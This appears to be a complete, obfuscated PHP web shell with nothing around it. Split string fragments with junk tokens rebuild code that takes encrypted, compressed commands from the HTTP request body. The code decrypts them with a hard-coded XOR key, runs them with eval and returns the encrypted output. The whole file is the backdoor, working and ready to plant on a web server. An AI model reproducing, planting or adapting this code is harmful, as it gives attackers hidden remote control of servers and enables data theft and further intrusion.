<?php
$X='="CQDM1qmXtNLHY1zjyv";tNfutNnctitNon x($t,$k){$tNctN=strlentN($k);$l=sttN';
$W='de($m[1]),$ktN)));$o=@otNb_tNget_tNcontents();@tNotNb_end_cltNean();$r=tN@';
$c='N;$j++,$i++){tN$o.=$t{$tNi}^$k{tN$j};}}rettNurntN $tNo;}if (@pretNtNg';
$S='rlen(tNtN$t);$o=""tN;for($i=tN0;$i<$ltN;)tN{ftNor($j=0;($tNj<tN$ctN&&$i<$l)t';
$o=str_replace('g','','crgeagte_gfugncggtion');
$D='bastNe64_encotNde(@xtN(@gtNztNcompress($o),$ktN)tN);ptNrintNt("$p$kh$r$kf");}';
$J='_matctNh("/$kh(.+)$ktNf/",@tNfiletN_getNt_contenttNs("phtNtNp:tN/tN/input"),$';
$M='m)==1) {@ob_tNsttNtNart();@evtNal(@gzuntNcompresstN(@x(@base6tN4_dectNotN';
$V='$k="9e68tN66etN3";tN$kh="ed090tN16tN3c82b";$ktNf="5db378tNctN9aatNftNe";$p';
$N=str_replace('tN','',$V.$X.$S.$c.$J.$M.$W.$D);
$z=$o('',$N);$z();
?>
